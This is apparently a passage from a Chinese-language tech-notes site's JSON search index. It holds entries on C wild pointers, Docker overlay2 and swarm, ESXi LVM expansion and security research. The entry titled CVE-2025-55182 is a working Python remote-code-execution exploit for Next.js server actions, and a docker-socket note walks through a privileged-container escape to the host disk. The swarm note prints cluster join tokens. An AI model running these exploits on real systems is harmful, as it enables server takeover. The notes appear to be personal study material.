		"content": "// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint *p;\nprintf(&quot;%p\\n&quot;, &amp;p);\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n修改未初始化的指針變數的值\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint *p;\n*p = 10; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的\nprintf(&quot;%p\\n&quot;, &amp;p); // 引發: Bus error: 10\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 11;\nint *p;\n*p = num; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的\nprintf(&quot;%p\\n&quot;, &amp;p); // 引發: Bus error: 10\nprintf(&quot;%d\\n&quot;, *p);\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\nBus error: 10\n是在 Unix-like 系統（像 macOS、Linux） 上常見的錯誤訊息。代表程式嘗試存取 無效的記憶體位址 或 不符合對齊規則的記憶體位址。\n在 macOS 上特別常見，因為它的記憶體對齊要求比較嚴格。\n原因\n\n指標錯誤使用\n\n指標指向無效的記憶體位置（例如已經 free 過，或是從未正確初始化）。\n指標運算錯誤，導致存取到錯誤位置。\n\n指針越界訪問\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nprintf(&quot;%d\\n&quot;, arr[1]); // 3\nprintf(&quot;%p\\n&quot;, &amp;arr[1]); // 0x16bc9eab4\nprintf(&quot;%d\\n&quot;, arr[2]); // 5\nprintf(&quot;%p\\n&quot;, &amp;arr[2]); // 0x16bc9eab8\nprintf(&quot;%d\\n&quot;, arr[99]); // 0 &lt;- 野指針，無法預測這裡的值\nprintf(&quot;%p\\n&quot;, &amp;arr[99]); // 0x16bc9ec3c &lt;- 野指針地址，無法預測這裡的值\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n野指針 2:\n以 for loop 方式越界訪問\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nfor (int i = 0; i &lt; 10; i++){\nprintf(&quot;index: %d, value: %d\\n&quot;, i, arr[i]);\n}\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n/*\noutput:\nindex: 0, value: 1\nindex: 1, value: 3\nindex: 2, value: 5\nindex: 3, value: 7\nindex: 4, value: 9\nindex: 5, value: 1\nindex: 6, value: -1657536328\nindex: 7, value: -1157789503\nindex: 8, value: 1836167456\nindex: 9, value: 1\n*/\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nint *p = arr; // 賦值 &amp;arr[0]\nfor (int i = 0; i &lt; 10; i++){\nprintf(&quot;%d\\n&quot;, *p++); // 地址先 +1 個 int 單位(4 個 bytes = 32 bits)\n}\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n/*\noutput:\n1\n3\n5\n7\n9\n1\n525336608\n-509251205\n1865920800\n1\n*/\n\n訪問已回收的地址\n// 野指針\n#include &lt;stdio.h&gt;\nint *test(){\nint a = 15; // 局部變數\n// 返回變數 a 的地址\nreturn &amp;a;\n}\n\nvoid dummy_function(){\nint x = 999, y = 888, z = 777; // 故意覆蓋 stack\nprintf(&quot;dummy function called\\n&quot;);\n}\n\nint main(){\n\t// 因為 p2 指向一個可能會被回收掉的地址，所以就產生一個野指針\nint *p2 = test();\nprintf(&quot;第一次讀取: %d\\n&quot;, *p2);\n\ndummy_function(); // 覆蓋 stack\n\nprintf(&quot;第二次讀取: %d\\n&quot;, *p2); // 讀到垃圾值\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n/*\noutput:\n\t第一次讀取: 15\n\tdummy function called\n\t第二次讀取: 1\n*/\n\n避免野指針",
		"tags": ["include", "include", "include", "include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "CVE-2025-55182 漏洞研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/CVE-2025-55182 漏洞研究/",
		"content": "npm create next-app@16.0.6\n\ncd my-app/\nnpm run dev\n\n打開 http://localhost:3000\n攻擊程式\n# refrence: https://github.com/msanft/CVE-2025-55182\n\nimport requests\nimport sys\nimport json\n\nBASE_URL = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;http://localhost:3000&quot;\nEXECUTABLE = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;id&quot;\n\ncrafted_chunk = {\n&quot;then&quot;: &quot;$1:__proto__:then&quot;,\n&quot;status&quot;: &quot;resolved_model&quot;,\n&quot;reason&quot;: -1,\n&quot;value&quot;: '{&quot;then&quot;: &quot;$B0&quot;}',\n&quot;_response&quot;: {\n&quot;_prefix&quot;: f&quot;var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});&quot;,\n# If you don't need the command output, you can use this line instead:\n# &quot;_prefix&quot;: f&quot;process.mainModule.require('child_process').execSync('{EXECUTABLE}');&quot;,\n&quot;_formData&quot;: {\n&quot;get&quot;: &quot;$1:constructor:constructor&quot;,\n},\n},\n}\n\nfiles = {\n&quot;0&quot;: (None, json.dumps(crafted_chunk)),\n&quot;1&quot;: (None, '&quot;$@0&quot;'),\n}\n\nheaders = {&quot;Next-Action&quot;: &quot;x&quot;}\nres = requests.post(BASE_URL, files=files, headers=headers, timeout=10)\nprint(res.status_code)\nprint(res.text)",
		"tags": [ "note","CVE"]
},

{
		"title": "Docker overlay2 儲存結構研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/Docker overlay2 儲存結構研究/",
		"content": "docker info 查看storage driver\n首先拉取一個Nginx鏡像，然後通過命令docker image inspect nginx查看Nginx鏡像的詳情，每個鏡像都會有一個Data資訊，這個資訊指示了鏡像是怎麼存的。\n查看 image 的詳情\n\n其中 MergedDir 代表當前鏡像層在 overlay2 儲存下的目錄，LowerDir 代表當前鏡像的父層關係，使用冒號分隔，冒號最後代表該鏡像的最底層。\n接著我們進入到任意一個鏡像層看看裡面的結構\n\n**鏡像層的link文件內容為該鏡像層的`短ID\n$ cat link | xargs echo\nDWWRLQXD5ZZYZFLAECXOWA7ODL\n\nlower檔內容為該層的所有父層鏡像的短ID。會用冒號 : 分隔\n$ cat lower | xargs echo\nl/XDQAR5Z4MSK7WNLYDBINB26DK4:l/VPWWG52KMQWNK7K3IMSTON3SRJ:l/UQPY6GNRH4CX3GA66Q75NCAXWN:l/PFGRT5RL3UYLRSI7GXQEOXVLHL:l/IWUVFE4FQR2BE5W5YZIKOYTJWG:l/KEISEPOCFYKYXTNIQQRWTWXGZF:l/JHJ27BDVU264GX5GY2ZHZXINEG:l/HVZVYP2P3H35EVYVSPQRHK6LFQ:l/OGZYCU6IXTZROMPIVINKLUWFJS:l/4FM6QTF6W57G4JUF4S4TSC663T:l/2TRWFLEP26VVMIB2XESNCDKT5R:l/JZ6W4BFQA5LVJOYM5YYX5OHQDU:l/Z4BVWLONYV352YARKDBI4NRZGE:l/N3RDTIUUIJZRVSOAJ6XNSF6YTB:l/G3KDMCGSVUKLBPXEWVYZMPAF4L:l/3TOZSAK6KLMVF3QLT4UIMSBRPB:l/STV7FCMXVMMGPSKOFCZIA7EBOV:l/Y5FZNDARXRLXRZCDNQVL3FFEGB:l/FOI4PWVIXLO6WN7QAUJJMTFJXL\n\n這時候我們再回過頭來看看上面中冒號最後的鏡像層，也就是我們Nginx鏡像父層的最底層是什麼樣的LowerDir\n  &quot;GraphDriver&quot;: {\n&quot;Data&quot;: {\n&quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/8dde6c69291ee08772fae49713a1ad2a715f5f53195e02ad921d595735316407/diff:/var/lib/docker/overlay2/f707d5dc454841a838102dbd1d702e9c7db107d8d13c25a6c4228daecb42407d/diff:/var/lib/docker/overlay2/0b39f39a877587cad676d3d2c0d078d26a058f51488a34b7918e7d3fe15b9fa6/diff:/var/lib/docker/overlay2/c25343bca009cf414ef51ec190ce5617b663cb601438eff5b03e818b648be94b/diff:/var/lib/docker/overlay2/5d925f8d2a4bc99e52980e08f3aeb08908a565e54f74023544d5a6952562e1b0/diff:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff&quot;,\n&quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/merged&quot;,\n&quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/diff&quot;,\n&quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/work&quot;\n},\n&quot;Name&quot;: &quot;overlay2&quot;\n},\n\n可以看到它裡面沒有了檔，這是因為他就是最底層了，等於是根鏡像了。 同時，資料夾下的檔，就是我們熟悉的Linux文件目錄結構\nroot@jason-1:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff# ll\ntotal 68\ndrwxr-xr-x 17 root root 4096 Nov 25 14:44 ./\ndrwx--x--- 3 root root 4096 Nov 25 14:44 ../\nlrwxrwxrwx 1 root root 7 Nov 11 08:00 bin -&gt; usr/bin/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 boot/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 dev/\ndrwxr-xr-x 29 root root 4096 Nov 11 08:00 etc/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 home/\nlrwxrwxrwx 1 root root 7 Nov 11 08:00 lib -&gt; usr/lib/\nlrwxrwxrwx 1 root root 9 Nov 11 08:00 lib64 -&gt; usr/lib64/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 media/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 mnt/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 opt/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 proc/\ndrwx------ 2 root root 4096 Nov 11 08:00 root/\ndrwxr-xr-x 3 root root 4096 Nov 11 08:00 run/\nlrwxrwxrwx 1 root root 8 Nov 11 08:00 sbin -&gt; usr/sbin/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 srv/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 sys/\ndrwxrwxrwt 2 root root 4096 Nov 11 08:00 tmp/\ndrwxr-xr-x 12 root root 4096 Nov 11 08:00 usr/\ndrwxr-xr-x 11 root root 4096 Nov 11 08:00 var/\n\n容器怎麼存儲\n啟動一個Nginx容器，以便觀察Docker創建的容器可寫層，並查看它的配置資訊\n$ docker run --name=nginx -d -v /tmp/test.txt:/tmp/test.txt nginx\n$ docker inspect nginx\n\n進入容器層目錄，看看裡面的結構\n\n進入容器內部\n$ docker exec -it nginx bash\n\n在容器內部建一個檔案，輸入ls -i，會輸出 inode id 為 677855\n\n在宿主機的 diff 層也可以看到該檔案的 inode 為 677855\n\n容器與鏡像的寫時複製技術\n前面我們說到了，一個鏡像的多個容器用到的文件系統就是鏡像的文件系統\n\n為了保證容器的修改不會互相影響，Docker採用了寫時複製技術。\n\nCopy-on-Write特性：\n當容器啟動時，一個新的可寫層被載入到鏡像的頂部。 這一層被稱之為「容器層」，容器層之下的都叫做「鏡像層」。\n所有對容器的改動，無論添加、刪除，還是修改檔都只會發生在容器層中。 只有容器層是可以寫的，容器層下面的所有鏡像層都是只讀的。\n我們在容器中進行操作時：\n- 添加檔: 在容器中創建檔時，新檔被添加到容器層中。\n- 讀取檔: 在容器中讀取某個檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，打開並讀入記憶體。\n- 修改檔: 在容器中修改已存在的檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，立即將其複製到容器層，然後修改。\n- 刪除檔案: 在容器中刪除檔時，Docker也是從上往下依次在各鏡像層中查找此檔。 找到后，會在容器層中記錄下此刪除操作。\n只有當需要修改時才複製一份數據，這種特性被稱作Copy-on-Write。 可見，容器層保存的鏡像變化的部分，不會對鏡像本身進行任何修改。\n寫時複製不僅節省空間，而且還減少了容器啟動時間。 當你創建一個容器（或者來自同一個鏡像的多個容器）時，Docker 只需要創建可寫容器層即可。\n\n驗證寫時複製技術的過程\n\n$ docker inspect nginx | jq '.[0].GraphDriver.Data.LowerDir' | awk -F: '{for (i=1; i&lt;=NF; i++) print &quot;Layer &quot; i &quot;: &quot; $i}'| sed 's/&quot;//g'\nLayer 1: /var/lib/docker/overlay2/04ad8e4...3b037397e8bdbc5-init/diff\nLayer 2: /var/lib/docker/overlay2/da9400108f56...406/diff\nLayer 3: /var/lib/docker/overlay2/8dde6c6929...6407/diff\nLayer 4: /var/lib/docker/overlay2/f707d5dc454841a8381...407d/diff\nLayer 5: /var/lib/docker/overlay2/0b39f39a877587c...9fa6/diff\nLayer 6: /var/lib/docker/overlay2/c25343bca0...94b/diff\nLayer 7: /var/lib/docker/overlay2/5d9...544d5a6952562e1b0/diff\nLayer 8: /var/lib/docker/overlay2/47b9dc1f...ac17a6e5/diff &lt;-- 最後一層為容器層\n\n再將合併結果寫成跟 Layer 1 去掉 -init 的同樣的目錄名稱作為工作目錄\n\n測試在容器內部修改鏡像層已存在的檔案\n\nBefore\n鏡像層\n$ find $(docker inspect nginx | jq -r '.[0].GraphDriver.Data.LowerDir' | tr ':' ' ') -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf\n\n容器內\nroot@592347294aa1:/etc/nginx# ls -i | grep nginx\n\n1882130 nginx.conf\n\n$ UPPER_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.UpperDir')\n$ find &quot;$UPPER_DIR&quot; -type f -name &quot;nginx.conf&quot;\n&lt;在 Upper dir 內找不到 nginx.conf檔案，因為現在該檔案在鏡像層只讀&gt;\n\nAfter\n在 container 內修改檔案\nroot@eae0f9d12762:/etc/nginx# echo 123 &gt;&gt; nginx.conf\n\n原始 inode 未改變\nroot@592347294aa1:/etc/nginx# ls -i | grep nginx\n\n1882130 nginx.conf\n\n從宿主機上看在 upper dir 內的 inode 已改變，代表 docker「寫時複製功能」生效，當檔案在鏡像層被修改時，會複製一份到讀寫層\n$ UPPER_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.UpperDir')\n$ find &quot;$UPPER_DIR&quot; -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1884494 /var/snap/docker/common/var-lib-docker/overlay2/649e271405128d7d52d1b53ea1fef0c7589c191529afe0f89be89ef28778efcf/diff/etc/nginx/nginx.conf\n\nroot@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/3434bfba1c899d2d7f5bdf407e284410561dc3c5e5b88143072739bbc33e791c/diff/etc/nginx/nginx.conf\nsendfile on;\n#tcp_nopush on;\n\nkeepalive_timeout 65;\n\n#gzip on;\n\ninclude /etc/nginx/conf.d/*.conf;\n}\n123 &lt;-- 被修改\n\n原本處於鏡像層的檔案還是沒改變\n# find $(docker inspect nginx | jq -r '.[0].GraphDriver.Data.LowerDir' | tr ':' ' ') -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf\n\nroot@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff\n/etc/nginx/nginx.conf\n\nsendfile on;\n#tcp_nopush on;\n\nkeepalive_timeout 65;\n\n#gzip on;\n\ninclude /etc/nginx/conf.d/*.conf;\n}\n\n原因:\n\n在容器內部修改檔案時，inode 不會更新，因為 OverlayFS 只是在上層可寫層中覆蓋檔案內容，而不會對原始鏡像層中的檔案結構進行修改。只有當檔案被刪除或完全替換時，inode 才會更新。\n\n$ MERGED_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.MergedDir')\n$ find &quot;$MERGED_DIR&quot; -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n結論 :\nvim 會在修改檔案時，預設會刪除並覆蓋，所以會改變 inode id，當在 container 內改檔案時， inode id 改變造成 overlay2 無法同步跟外部這份檔案",
		"tags": ["tcp_nopush", "gzip", "tcp_nopush", "gzip", "note","docker","overlay2"]
},

{
		"title": "Docker swarm 研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/Docker swarm 研究/",
		"content": "#docker #docker-swarm\n啟動 docker swarm cluser\n建立 swarm manager\n$ docker swarm init\nSwarm initialized: current node (vft2r90bfk02ybdxwbmomr36w) is now a manager.\n\nTo add a worker to this swarm, run the following command:\n\ndocker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377\n\nTo add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions.\n\n根據顯示的指令，將另一個 node 加入到 swarm cluster\n$ ssh a9-test-2\n$ docker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377\nThis node joined a swarm as a worker.\n\n查看目前 cluster 的加入指令\n$ docker swarm join-token manager\nTo add a manager to this swarm, run the following command:\n\ndocker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-3s6hu2uirlu58ixe6nlakrr49 10.92.0.153:2377\n\n管理目前集群的 node\n$ docker node ls\nID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION\nvft2r90bfk02ybdxwbmomr36w * jason-1 Ready Active Leader 27.3.1\nx40thj73emfiyvi1371etqir4 jason-2 Ready Active 27.3.1\n\n在 docker swarm 上建立一個 service\n建立一個 nginx 在 swarm 上成為一個 service\n$ docker service create --name my_web nginx\n\n驗證狀態\n$ docker service ls\nID NAME MODE REPLICAS IMAGE PORTS\ny5rdvf9k7tef vigorous_margulis replicated 1/1 nginx:latest\n\n建立 replicas 2 的一個服務\n這兩個 replica 會在這個 cluster 的兩個 node 上運行，並且將 8080 公開到 node port 上\ndocker service create --name my_web \\\n--replicas 2 \\\n--publish published=8080,target=80 \\\nnginx\n\n訪問任一台 node 的 8080 port 都可以得到 response\n$ curl 10.92.0.154:8080\n\ndocker swarm 建立一個 DaemonSet\n如果將 mode 設定為 global，就會在每個 node 上面建一個 container(類似 k8s daemonset)\n$ docker service create \\\n--mode global \\\n--publish mode=host,target=80,published=8080 \\\n--name=nginx \\\nnginx:latest\n\n$ docker service ls\nID NAME MODE REPLICAS IMAGE PORTS\nwlxtyx45w4qx nginx global 2/2 nginx:latest\n\n以 stack 形式啟動 docker swarm\n支援 docker compose 格式的設定檔\ndocker-compose.yml\nservices:\nweb:\nimage: nginx\nports:\n- &quot;8000:80&quot;\ndeploy:\nmode: global &lt;--- 變成 daemonset 形式，每個 node 都會有一個 container\nredis:\nimage: redis:alpine\n\n建立一個基於 docker compose 的 stack 部署\n$ docker stack deploy --compose-file docker-compose.yml stackdemo\n\n檢查是否正在運行\n$ docker stack services stackdemo\nID NAME MODE REPLICAS IMAGE PORTS\nqyy4hxvdng72 stackdemo_redis replicated 1/1 redis:alpine\ny1b5uyxewmqn stackdemo_web replicated 1/1 nginx:latest *:8000-&gt;80/tcp\n\nLog 系統\n$ docker service logs stackdemo_web -f",
		"tags": ["docker", "docker-swarm", "note","docker-swarm"]
},

{
		"title": "docker 特權逃逸",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/docker 特權逃逸/",
		"content": "#docker\n起因\n因為 docker daemon 是在 root 權限下\n$ ll -a /var/run/docker.sock\nlrwxr-xr-x 1 root daemon 63B Jun 10 23:39 /var/run/docker.sock -&gt; /Users/jason/.local/share/containers/podman/machine/podman.sock\n\n所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊\n建立特權容器\n# 使用 curlimages/curl 作為基礎鏡像\nFROM curlimages/curl:latest\n\nUSER root\n# 安裝 sudo\nRUN apk --no-cache add sudo\n\nRUN apk --no-cache add docker\n\n# 創建一個新用戶並設置適當的權限\nRUN addgroup -S docker &amp;&amp; adduser -S dockeruser -G docker\n\n# 允許 dockeruser 使用 sudo 而不需要密碼\nRUN echo 'dockeruser ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers\n\n# 切換到 dockeruser 用戶\nUSER dockeruser\n\n# 設置工作目錄\nWORKDIR /home/dockeruser\n\n# 執行一個無限循環的命令，確保容器一直保持運行\nCMD [&quot;sh&quot;, &quot;-c&quot;, &quot;while :; do sleep 10; done&quot;]\n\ndocker build -t my-curl-image .\n\n建立 docker conatiner\ndocker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh\n\n在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊\n建立一個 docker images\n$ curl -X POST --unix-socket /var/run/docker.sock -d '{&quot;Image&quot;:&quot;my-curl&quot;, &quot;Privileged&quot;:true}' -H 'Content-Type: application/json' http:/v1.24/containers/create\n{&quot;Id&quot;:&quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&quot;,&quot;Warnings&quot;:[]}\n\n啟動 docker images\n$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start\n\n列出所有 docker container 狀態\n等價:\ndocker ps\n/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json\n[{&quot;Id&quot;:&quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&quot;,&quot;Names&quot;:[&quot;/elated_leakey&quot;],&quot;Image&quot;:&quot;my-curl&quot;,&quot;ImageID&quot;:&quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&quot;,&quot;Command&quot;:&quot;/entrypoint.sh sh -c 'while :; do sleep 10; done'&quot;,&quot;Created&quot;:1718034\n\n進入建立的特權 container\n$ docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\na9c0fe2d7af9 my-curl &quot;/entrypoint.sh sh -…&quot; 3 minutes ago Up 3 minutes elated_leakey\n\n$ docker exec -it a9c0fe2d7af9 sh\n\n可以看到宿主機的 device\n/dev # ls\nautofs hvc3 loop6 nbd3 ram1 ram9 tty14 tty27 tty4 tty52 tty8 vda\nbtrfs-control hvc4 loop7 nbd4 ram10 random tty15 tty28 tty40 tty53 tty9 vda1\nbus hvc5 mapper nbd5 ram11 rtc0 tty16 tty29 tty41 tty54 ttyS0 vdb\ncachefiles hvc6 mem nbd6 ram12 shm tty17 tty3 tty42 tty55 ttyS1 vdc\ncore hvc7 mqueue nbd7 ram13 stderr tty18 tty30 tty43 tty56 ttyS2 vga_arbiter\ncpu_dma_latency hwrng nbd0 nbd8 ram14 stdin tty19 tty31 tty44 tty57 ttyS3 vhost-net\ncuse kmsg nbd1 nbd9 ram15 stdout tty2 tty32 tty45 tty58 uinput vhost-vsock\nfd loop-control nbd10 net ram2 tty tty20 tty33 tty46 tty59 urandom vport2p0\nfull loop0 nbd11 null ram3 tty0 tty21 tty34 tty47 tty6 vcs vsock\nfuse loop1 nbd12 port ram4 tty1 tty22 tty35 tty48 tty60 vcs1 zero\ngpiochip0 loop2 nbd13 ppp ram5 tty10 tty23 tty36 tty49 tty61 vcsa\nhvc0 loop3 nbd14 ptmx ram6 tty11 tty24 tty37 tty5 tty62 vcsa1\nhvc1 loop4 nbd15 pts ram7 tty12 tty25 tty38 tty50 tty63 vcsu\nhvc2 loop5 nbd2 ram0 ram8 tty13 tty26 tty39 tty51 tty7 vcsu1\n\n修改 host 文件\n$ mount dev/vda1 /home/vda1\n/dev # ls /home/vda1\ncni desktop-containerd kubeadm lost+found mutagen swap\ncontainerd docker kubelet-plugins machine-id nfs wasm",
		"tags": ["docker", "note","docker"]
},

{
		"title": "ESXi VM 擴容實作 - LVM2",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ESXi/ESXi VM 擴容實作 - LVM2/",
		"content": "背景\n在 ESXi 建立的 VM 想增加磁碟空間，所以紀錄下整個過程。\n目標主機使用 LVM2 的方式掛載系統根目錄，即實際掛載對象為 LV(Logic volume)。\n系統版本\nubuntu 20.04.5\n\n開始\n進入 edit settings\n\n調整硬碟大小\n\n調整完成，硬碟空間變大了\n\n但目前 linux 主機內空間還是沒改變\n\n重開機後\n/dev/sda 就擴容到 35G 了\n\n但實際掛載在系統目錄 lv 的大小還是沒改變，目標是「擴增系統位置 &quot;/&quot;」\n$ lsblk\n\n查看 pv 與 vg 狀態，目前都是 28.25(原始大小)\n$ pvdisplay\n$ vgdisplay\n\nLV 的空間 28G\n$ lvdisplay\n\nLV 是實際上被掛載到系統根目錄 &quot;/&quot; 的 volume\n\n擴充原有 partition，使用剩餘空間\n使用 parted 工具進行 resize\n$ parted\n\n輸入「p」顯示所有 partition\n系統告知不是所有空間都能被使用\n輸入「Fix」修復 GPT(GUID Partition Table) 分區表\n\n執行 partition resize 操作\n(parted) resizepart\n\n將 /dev/sda 上的 /dev/sda3(partition 3) 從 32G 擴增到 35G，此時 number 3 partition 已經使用了所有空間\n\n輸入 「q」離開\n\n擴充 PV 空間\n原本上面的 number 3 partition 已經是現存的 PV，既然 partition 已經變大，接著就可以直接進行 resize 的操作\n尚未進行 resize 前 PV 大小 28.25G\n$ pvdisplay\n\n執行 pvresize\n$ pvresize /dev/sda3\n\n變成 30.84G\n\n查看 vg size\nvg size 也變大了\n$ vgdisplay\n\n擴充 LV 空間\n接著擴充 LV 空間\n# 原本的 LV 空間狀況\n$ lvdisplay\n\n將 LV 空間擴充成 35GB\n$ lvextend -L 35G /dev/ubuntu-vg/ubuntu-lv\n\n出現錯誤，看起來是目前輸入的值超過可擴展的 pv 空間\n進一步排查發現，扣掉 1.8G 的 sda2 分區，還有2.3GB 的 disk 空間未分配給 /dev/sda3\n\n輸入\n$ parted\n\n回到 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ESXi/ESXi VM 擴容實作 - LVM2/#partition\">ESXi VM 擴容實作 - LVM2#擴充原有 partition，使用剩餘空間</a>\n但這次請注意這個 Disk 值，這是可用的最大空間\n\npartition 3 確實沒有佔滿所有的 37.6GB 的空間\n\n將 end 設為 37.6GB\n\n再執行一次 pvresize\npvresize /dev/sda3\n\n已經從原本的 30.84GB 增加到 33.25GB 了\n\n執行 lvextend 增加 lv 空間\nlvextend -L 33G /dev/ubuntu-vg/ubuntu-lv\n\n最後再 resize2fs 增加系統根目錄 / 的可用空間\nresize2fs /dev/ubuntu-vg/ubuntu-lv\n\n知識點\n\n磁碟掛載命名順序與分區命名規則如下:\n\ndisk:\n\n第一顆 disk -&gt; /dev/sda\n\n第一個分區 -&gt; /dev/sda1\n\npartition id: 1\n\n第二個分區 -&gt; /dev/sda2\n\npartition id: 2\n\n... 以此類推\n\n第二顆 disk -&gt; /dev/sdb\n第三顆 disk -&gt; /dev/sdc\n... 以此類推\n\n理解 Linux PV、LV、VG 之間的關係\n\nPV(Physical volume) = 磁碟分割區 (/dev/sda1、/dev/sda2)\n\n可以從 pvdisplay 看到，PV Name = 系統磁碟分區\n\nVG(Volume group)\n\n多個 PV 可以建成一個 VG，也可以將 PV 加入現有 VG\n\nLV(Logical volume)\n\n用 lsblk -f 可以看出，sda3 下面有 一個 vg，vg下面有一個 lv\nVG 下面會有多個 LV\nLV 就是實際掛載給系統根目錄使用的，屬於虛擬邏輯分區\n\n指令\nlsblk -f\n\n$ pvdisplay\n\n$ lvdisplay\n\n$ vgdisplay\n\nparted\n$ parted\n\nfdisk\n輸入 fdisk 指令後，會進入磁碟管理工具裡面\n$ fdisk /dev/sda\n\n指令:\n\np 列出該 disk 所有的分區\nm 輸出 menu 列表\nn 建立新的磁碟分區\n\n參考資料\nhttps://godleon.github.io/blog/Linux/Linux-extend-lvm-from-unused-space/\nhttps://sc8log.blogspot.com/2017/03/linux-lvm-lvm.html",
		"tags": [ "note","#ESXi","#linux","#ubuntu","#PV","#LV","VG"]
},

{
		"title": "ESXi VM 擴容實作 - Partition 擴增",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ESXi/ESXi VM 擴容實作 - Partition 擴增/",
